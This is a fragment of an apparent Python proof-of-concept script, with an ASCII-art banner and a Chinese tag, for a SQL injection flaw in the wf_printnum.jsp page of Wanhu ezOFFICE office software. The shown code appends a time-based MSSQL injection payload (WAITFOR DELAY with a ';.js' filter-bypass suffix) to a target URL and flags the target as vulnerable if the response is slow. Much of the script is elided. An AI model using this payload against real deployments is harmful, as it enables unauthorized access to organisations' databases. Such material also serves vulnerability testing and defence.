               ...
               `88'       88           8888"88,     88 88   `8b  88 88      88888  
                ...
                88        88           88     "88,  88 88     `888   `"Y88888P"   
                            ...
                            888888888888 
                                        ...
                                        tag: this is a  万户ezOFFICE-wf_printnum.jspSQL注入漏洞 poc
...
def poc(target):
    if target[-1] == '/':
        ...
        target = target
    path = "/defaultroot/platform/bpm/work_flow/operate/wf_printnum.jsp;.js?recordId=1;WAITFOR%20DELAY%20%270:0:5%27--"
    url = target + path
    headers = {
    ...
    try:
        ...
        if  response1.status_code == 200 and response_time > 4:
